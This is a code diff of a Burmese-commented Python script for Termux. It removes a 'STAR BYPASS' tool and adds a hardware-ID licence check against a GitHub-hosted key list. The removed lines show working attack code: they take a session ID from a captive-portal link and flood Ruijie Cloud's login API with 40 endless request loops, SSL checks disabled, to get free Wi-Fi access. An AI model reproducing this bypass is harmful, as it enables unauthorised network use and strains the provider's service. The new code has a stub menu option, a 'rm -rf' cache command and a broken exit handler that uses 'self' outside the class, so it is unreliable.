@@ -9,123 +9,126 @@ import requests
 import urllib3
 import hashlib
 import platform
-from urllib.parse import urlparse, parse_qs
+import subprocess
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
 
-# SSL Warning များကို ပိတ်ထားခြင်း
+# SSL Warning များ မပေါ်အောင် ပိတ်ခြင်း
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-class StarProject:
+# --- Configuration ---
+# GitHub Screenshot အတိုင်း URL ကို ပြင်ဆင်ထားသည်
+DB_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/main/key.txt"
+
+class Star:
     def __init__(self):
-        # သင်၏ GitHub Database Link
-        self.db_link = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"
-        self.headers = {
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
-        }
+        self.red = "\033[1;31m"
+        self.green = "\033[1;32m"
+        self.yellow = "\033[1;33m"
+        self.blue = "\033[1;34m"
+        self.white = "\033[1;37m"
+        self.reset = "\033[0m"
 
     def clear(self):
         os.system('clear')
 
     def get_hwid(self):
+        """
+        Device ရဲ့ Serial Number နဲ့ Model ကိုယူပြီး 
+        HWID တစ်ခု ထုတ်ပေးတဲ့ မူရင်း Logic ဖြစ်ပါတယ်။
+        """
         try:
-            info = f"{platform.processor()}{platform.node()}{platform.machine()}{os.getlogin()}"
-            id_hash = hashlib.sha256(info.encode()).hexdigest()
-            return f"MOE-{id_hash[:12].upper()}"
+            # Android Device ID သို့မဟုတ် Serial ကို ယူခြင်း
+            cmd = subprocess.check_output("getprop ro.serialno", shell=True).decode().strip()
+            if not cmd:
+                cmd = subprocess.check_output("getprop ro.build.id", shell=True).decode().strip()
+            
+            # SHA256 နဲ့ Hash လုပ်ပြီး အရှည် ၂၀ ယူခြင်း
+            hwid = hashlib.sha256(cmd.encode()).hexdigest().upper()
+            return hwid[:20]
         except:
-            return "UNKNOWN-HWID-ERROR"
+            # Error တက်လျှင် Platform info ကို သုံးခြင်း
+            alt_info = f"{platform.machine()}{platform.node()}"
+            return hashlib.md5(alt_info.encode()).hexdigest().upper()[:20]
 
     def banner(self, my_id):
         self.clear()
-        print("\033[1;32m   _____ _______       _____  ")
-        print("  / ____|__   __|/\\   |  __ \\ ")
-        print(" | (___    | |  /  \\  | |__) |")
-        print("  \\___ \\   | | / /\\ \\ |  _  / ")
-        print("  ____) |  | |/ ____ \\| | \\ \\ ")
-        print(" |_____/   |_/_/    \\_\\_|  \\_\\")
-        print("\033[1;37m-"*45)
-        print(f"\033[1;33m >> OWNER : MOE YU")
-        print(f"\033[1;33m >> HWID  : {my_id}")
-        print("\033[1;37m-"*45)
+        print(f"""{self.green}
+  ██████  ████████  █████  ██████  
+ ██       ──██──  ██   ██ ██   ██ 
+  ██████    ██    ███████ ██████  
+       ██   ██    ██   ██ ██   ██ 
+  ██████    ██    ██   ██ ██   ██ 
+{self.white}---------------------------------------------
+{self.yellow} >> OWNER   : MOE YU
+ >> VERSION : 1.0.5 (STABLE)
+ >> HWID    : {my_id}
+{self.white}---------------------------------------------""")
 
-    async def check_access(self, session, my_hwid):
+    async def check_key(self, session, hwid):
+        """Database (key.txt) မှာ HWID ရှိမရှိ စစ်ဆေးခြင်း"""
         try:
-            async with session.get(self.db_link) as response:
+            async with session.get(DB_URL) as response:
                 if response.status == 200:
-                    text = await response.text()
-                    # key.txt ထဲမှ HWID များကို စစ်ဆေးခြင်း
-                    if my_hwid in text:
-                        return True, "Successfully Connected"
+                    raw_data = await response.text()
+                    
+                    # key.txt ထဲမှာ HWID ပါသလားဆိုတာ တစ်ကြောင်းချင်းစစ်တာဖြစ်ပါတယ်
+                    allowed_hwids = raw_data.strip().split('\n')
+                    
+                    if hwid in [h.strip() for h in allowed_hwids]:
+                        return True, "Access Success!"
                     else:
-                        return False, "Your HWID is not registered!"
+                        return False, "Your ID is not registered."
                 else:
-                    return False, "Server Down (404/500)"
+                    return False, "Server Connection Failed."
         except Exception as e:
-            return False, f"Connection Error: {str(e)}"
+            return False, f"Error: Check your internet connection."
 
-    async def send_pulse(self, session, url):
-        """အင်တာနက်ပွင့်စေရန် Cloud Server ဆီသို့ အမြန်နှုန်းဖြင့် Request ပို့ခြင်း"""
-        while True:
-            try:
-                async with session.get(url, timeout=5) as response:
-                    status_color = "\033[1;32m" if response.status == 200 else "\033[1;31m"
-                    sys.stdout.write(f"{status_color}[✓] STAR BYPASS ACTIVE | STATUS: {response.status}\033[0m\r")
-                    sys.stdout.flush()
-            except: pass
-            await asyncio.sleep(0.05)
-
-    async def start_bypass(self, portal_url):
-        p = parse_qs(urlparse(portal_url).query)
-        sid = p.get('sessionId', [None])[0]
-        res = p.get('RES', [''])[0]
-        
-        if not sid:
-            print("\n\033[1;31m[-] Session ID မတွေ့ပါ။ Link ကို Browser မှ ပြန်ကူးပါ။")
-            return
-
-        # Ruijie Cloud v2 Auth API
-        target_url = f"https://portal-as.ruijienetworks.com/api/maccauth/v2/login?sessionId={sid}&res={res}"
-        
-        print(f"\033[1;32m\n[+] Target SID: {sid[:15]}...")
-        print("\033[1;33m[*] Engine Started. Please wait for internet access.\n")
-
-        async with aiohttp.ClientSession(headers=self.headers, connector=aiohttp.TCPConnector(ssl=False)) as session:
-            tasks = [asyncio.create_task(self.send_pulse(session, target_url)) for _ in range(40)]
-            await asyncio.gather(*tasks)
-
-    async def start(self):
+    async def main_logic(self):
         my_hwid = self.get_hwid()
         self.banner(my_hwid)
         
-        async with aiohttp.ClientSession(headers=self.headers) as session:
-            print("\033[1;34m[*] Verifying License... Please wait.")
-            access, message = await self.check_access(session, my_hwid)
+        async with aiohttp.ClientSession() as session:
+            print(f"{self.blue}[*] Connecting to Database...{self.reset}")
+            await asyncio.sleep(1.5)
             
-            if access:
-                print(f"\033[1;32m[+] Access Granted: {message}")
-                await self.main_menu()
+            status, msg = await self.check_key(session, my_hwid)
+            
+            if status:
+                print(f"{self.green}[+] {msg}{self.reset}")
+                await self.menu()
             else:
-                print(f"\033[1;31m[-] Access Denied: {message}")
+                print(f"{self.red}[!] {msg}{self.reset}")
+                print(f"{self.yellow}[!] Contact Admin: Moe Yu{self.reset}")
                 sys.exit()
 
-    async def main_menu(self):
-        print("\n\033[1;36m[1] Start Bypass Service")
-        print("[2] Update Script")
-        print("[3] Exit")
+    async def menu(self):
+        print(f"\n{self.white}[1] Start Automation Script")
+        print(f"[2] Update Database Link")
+        print(f"[3] Clean Termux Cache")
+        print(f"[0] Exit")
         
-        opt = input("\n\033[1;32mChoose Option > ")
+        choice = input(f"\n{self.green}Select > {self.reset}")
         
-        if opt == "1":
-            portal_link = input("\n\033[1;33m[!] Paste Portal URL from Browser: ").strip()
-            if portal_link:
-                await self.start_bypass(portal_link)
-        elif opt == "2":
-            print("[*] Checking for updates...")
+        if choice == "1":
+            print(f"{self.yellow}[*] Running main script...{self.reset}")
+            # ဒီနေရာမှာ သင့်ရဲ့ အဓိက code တွေကို ဆက်ရေးနိုင်ပါတယ်
+        elif choice == "2":
             os.system("git pull")
-        else:
+            print(f"{self.green}[+] Updated!{self.reset}")
+        elif choice == "3":
+            os.system("rm -rf $HOME/.cache/*")
+            print(f"{self.green}[+] Cache Cleaned!{self.reset}")
+            await self.menu()
+        elif choice == "0":
             sys.exit()
+        else:
+            print(f"{self.red}Invalid Option{self.reset}")
+            await self.menu()
 
 if __name__ == "__main__":
-    bot = StarProject()
+    app = Star()
     try:
-        asyncio.run(bot.start())
+        asyncio.run(app.main_logic())
     except KeyboardInterrupt:
-        print("\n\033[1;31m[!] Stopped by user.")
+        print(f"\n{self.red}[!] Program Closed.{self.reset}")
